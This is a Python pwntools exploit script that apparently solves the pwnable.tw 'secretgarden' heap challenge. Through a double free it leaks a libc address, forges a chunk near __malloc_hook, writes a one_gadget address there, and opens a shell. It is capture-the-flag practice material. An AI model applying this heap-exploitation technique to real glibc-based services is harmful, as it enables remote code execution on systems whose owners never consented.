#coding:utf-8
from pwn import *
# import pwn_framework as pf
from time import sleep

global io
ru = lambda p, x : p.recvuntil(x)
sn = lambda p, x : p.send(x)
rl = lambda p  : p.recvline()
sl = lambda p, x : p.sendline(x)
rv = lambda p, x=1024 : p.recv(numb = x)
sa = lambda p, a, b : p.sendafter(a,b)
sla = lambda p, a, b : p.sendlineafter(a,b)
rr = lambda p, t : p.recvrepeat(t)

# amd64 or x86
context(arch = 'amd64', os = 'linux', endian = 'little')
context.log_level = 'debug'
context.terminal = ['tmux', 'splitw', '-h', '-p', '75']

filename = "./secretgarden"
ip = "chall.pwnable.tw"
port = 10203

LOCAL = True if len(sys.argv)==1 else False

global bps # Break Points
global gds # Gdb Debug Symbols
bps = []
gds = {}

elf = ELF(filename)

remote_libc = "./libc_64.so.6"
if LOCAL:
    # io = process(filename)
    io = process(filename, env={'LD_PRELOAD': remote_libc})
    # io = gdb.debug(filename, "set  follow-fork-mode child\nb free\nc", )
    # io = gdb.debug(filename, "set  follow-fork-mode child\nset exec-wrapper env 'LD_PRELOAD=./libc_2.27.so'\nb *0x555555554ECA\n", )
    # libc = ELF("/home/pu1p/glibcs/glibc-2.27_out/lib/libc-2.27.so")
    # libc = elf.libc
    libc = ELF(remote_libc)

    # # if LD_PRELOAD multiple libs, split with ':'
    # io = process(filename, env={'LD_PRELOAD': remote_libc}) 
    # libc = ELF(remote_libc)
else:
    context.log_level = 'debug'
    io = remote(ip, port)
    libc = ELF(remote_libc)
    # libc = elf.libc

def mydebug(p, s=''):
    def _get_bstr():
        global bps
        b_str =""
        for break_point in bps:
            if type(break_point) == int:
                b_str += "b *%s\n"%(hex(break_point))
            elif type(break_point) == str:
                b_str += "b %s\n"%(break_point)
            else:
                pause(p, "[_get_bstr] unsupported break point type : "+str(break_point))
        return b_str
    def _get_gds_str():
        global gds
        res = ""
        for name in gds:
            val = gds[name]
            if type(name) != str:
                pause(p, "[_get_gds_str] unsupported name type : "+str(type(name)))
            if type(val) != int:
                pause(p, "[_get_gds_str] unsupported val type : "+str(type(val)))
            res += "set $%s=%d\n"%(name, gds[name])
        return res
    if not LOCAL:
        return
    gdb.attach(p, _get_bstr()+_get_gds_str()+s)

def pause(p, s = 'pause'):
    if LOCAL:
        print('pid: ' + str(p.pid))
        return raw_input(s)
    else:
        return raw_input(s)

def choice(p, idx):
    sla(p, "Your choice : ", str(idx))

def lg(name, val):
    log.info(name+" : "+hex(val))

def add_flower(io, size, name, color):
    choice(io, 1)
    sla(io, "Length of the name :", str(size))
    sa(io, "The name of flower :", name)
    sla(io, "The color of the flower :", color)

def show(io):
    choice(io, 2)

def remove_flow(io, idx):
    choice(io, 3)
    sla(io, "remove from the garden:", str(idx))

def clean(io, ):
    choice(io, 4)

# bps.append("*$rebase(0xC65)")  
gds['data']=0x202040+0x555555554000


add_flower(io, 0x10, b'a'*0x10, b'b'*0x10)  # 0
add_flower(io, 0xa0, b'x', b'x')    # 1

add_flower(io, 0x10, b'c'*0x10, b'd'*0x10) # 2
remove_flow(io, 1)
clean(io, )

remove_flow(io, 0)
remove_flow(io, 2)
remove_flow(io, 0)


# show(io)

add_flower(io, 0x10, b'\x20', b'e'*0x10) # 3
add_flower(io, 0x10, b'a', b'e'*0x10) # 4
add_flower(io, 0x10, b'a', b'e'*0x10) # 5

add_flower(io, 0x10, b'a', b'f'*0x10) # 6

show(io, )

ru(io, b"Name of the flower[5] :")
libc_addr = u64(rv(io, 6) + b'\x00\x00')
libc.address = libc_base = libc_addr - 0x3c3b61
mh = libc.sym['__malloc_hook']
fake_chunk = mh - 0x23

one = [0x45216, 0x4526a, 0xef6c4, 0xf0567]

log.info("libc_addr : 0x%x", libc_addr)
log.info("libc_base : 0x%x", libc_base)
log.info("fake_chunk : 0x%x", fake_chunk)
log.info("one_shot : 0x%x", one[3] + libc_base)
input()




add_flower(io, 0x60, b'a', b'f'*0x10) # 6
add_flower(io, 0x60, b'a', b'f'*0x10) # 7

remove_flow(io, 6)
remove_flow(io, 7)
remove_flow(io, 6)

add_flower(io, 0x60, p64(fake_chunk), b'f'*0x10)
add_flower(io, 0x60, p64(fake_chunk), b'f'*0x10)
add_flower(io, 0x60, p64(fake_chunk), b'f'*0x10)





add_flower(io, 0x60, b'a'*(0x13-8) + p64(one[2]+libc_base) + p64(libc.sym['__libc_realloc']+20), b'f'*0x10)

# mydebug(io,"")


choice(io, 1)

io.interactive()